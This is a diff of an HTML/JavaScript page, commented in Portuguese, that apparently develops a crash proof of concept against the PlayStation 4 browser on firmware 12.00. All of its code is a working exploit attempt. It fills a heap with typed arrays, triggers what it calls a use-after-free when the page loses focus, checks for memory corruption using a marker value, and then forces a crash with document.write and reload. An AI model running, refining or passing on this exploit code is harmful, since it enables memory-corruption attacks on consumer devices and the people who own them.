@@ -2,56 +2,54 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>PS4 Crash PoC - Isolation</title>
+    <title>PS4 Crash Isolation - Leandro</title>
 </head>
 <body>
 
-    <h1>PS4 12.00 - Isolated Crash Tests</h1>
-    <p>Foco: Replicar o comportamento do arquivo original para causar o CE-36329-3.</p>
+    <h1>PS4 12.00 - Crash Isolation</h1>
+    <p>Foco: Replicar exatamente o comportamento do arquivo original.</p>
 
-    <button onclick="runTest(1)">TEST 1 (Original)</button><br><br>
-    <button onclick="runTest(2)">TEST 2 (Spray +2k)</button><br><br>
-    <button onclick="runTest(3)">TEST 3 (Spray +4k)</button><br><br>
-    <button onclick="runTest(4)">TEST 4 (Iframe + Original)</button><br><br>
-    <button onclick="runTest(5)">TEST 5 (Fast Trigger)</button><br><br>
-    <button onclick="runTest(6)">TEST 6 (Max Stability)</button>
+    <button onclick="runCrashTest1()">Run Crash Test 1 (Original Specs)</button>
+    <div id="result1"></div>
 
-    <div id="crash-result"></div>
+    <hr>
+
+    <button onclick="runCrashTest2()">Run Crash Test 2 (High Intensity)</button>
+    <div id="result2"></div>
 
     <script>
-    function runTest(type) {
-        const result = document.getElementById('crash-result');
+    const PATTERN = 2.121995791e-314; // 0x4141414141414141
+
+    // VARIAÇÃO 1: EXATAMENTE IGUAL AO SEU ARQUIVO
+    function runCrashTest1() {
+        const result = document.getElementById('result1');
         result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
         
         let controllers = [];
-        const PATTERN = 2.121995791e-314; // 0x4141414141414141
-        
-        // Setup original dos objetos alvo
+        // Step 1: Create objects (Identical to original)
         for(let i = 0; i < 5000; i++) {
             let arr = new Float64Array(8);
             arr[0] = i;
             controllers.push(arr);
         }
         
-        // Entra em Fullscreen
+        // Step 2: Fullscreen (Identical to original)
         const elem = document.documentElement;
         if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
         
+        // Step 3: Trigger on Options (Blur)
         window.onblur = function() {
-            // Variação de intensidade do spray para encontrar o ponto ideal na 12.00
-            let spraySize = 8000;
-            if (type === 2) spraySize = 10000;
-            if (type === 3) spraySize = 12000;
-            if (type === 6) spraySize = 15000;
-
+            result.innerHTML += '<p>UAF triggered</p>';
+            
+            // Step 4: Spray (Identical: 8000 iterations)
             let spray = [];
-            for(let i = 0; i < spraySize; i++) {
+            for(let i = 0; i < 8000; i++) {
                 let p = new Float64Array(10);
                 p.fill(PATTERN);
                 spray.push(p);
             }
             
-            // Verificação de corrupção idêntica ao seu original
+            // Step 5: Verification (Identical to original)
             let corrupted = null;
             for(let i = 0; i < controllers.length; i++) {
                 if (controllers[i][0] === PATTERN) {
@@ -60,25 +58,62 @@
                 }
             }
             
-            // O GATILHO DO CRASH: Sequência document.write original
-            // Removi o setTimeout de 3 segundos para o crash ser imediato no onblur
-            if (corrupted || type >= 4) {
-                if (type === 4) {
-                    // Teste 4: Adiciona a remoção de um iframe antes do write
-                    let ifrm = document.createElement('iframe');
-                    document.body.appendChild(ifrm);
-                    ifrm.remove();
-                }
+            if (corrupted) {
+                result.innerHTML += '<p>Corruption confirmed</p>';
+                // Step 6: The document.write sequence that causes the CE-36329-3
+                setTimeout(() => {
+                    document.open();
+                    document.write('<html><body><h1>Crash</h1></body></html>');
+                    document.close();
+                    setTimeout(() => location.reload(), 500);
+                }, 3000);
+            }
+        };
+    }
 
-                document.open();
-                document.write('<html><body><h1>Crash</h1></body></html>');
-                document.close();
-                
-                // O reload final que ajuda a forçar a quebra da pilha de memória
-                setTimeout(() => location.reload(), 10);
+    // VARIAÇÃO 2: MESMA LÓGICA, AUMENTANDO APENAS O SPRAY (12000)
+    function runCrashTest2() {
+        const result = document.getElementById('result2');
+        result.innerHTML = '<h4>Crash PoC Running - Press OPTIONS button</h4>';
+        
+        let controllers = [];
+        for(let i = 0; i < 5000; i++) {
+            let arr = new Float64Array(8);
+            arr[0] = i;
+            controllers.push(arr);
+        }
+        
+        const elem = document.documentElement;
+        if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
+        
+        window.onblur = function() {
+            let spray = [];
+            // Aumentado para 12000 para garantir a corrupção caso os 8000 falhem
+            for(let i = 0; i < 12000; i++) {
+                let p = new Float64Array(10);
+                p.fill(PATTERN);
+                spray.push(p);
+            }
+            
+            let corrupted = null;
+            for(let i = 0; i < controllers.length; i++) {
+                if (controllers[i][0] === PATTERN) {
+                    corrupted = controllers[i];
+                    break;
+                }
+            }
+            
+            if (corrupted) {
+                setTimeout(() => {
+                    document.open();
+                    document.write('<html><body><h1>Crash</h1></body></html>');
+                    document.close();
+                    setTimeout(() => location.reload(), 500);
+                }, 3000);
             }
         };
     }
     </script>
+
 </body>
 </html>
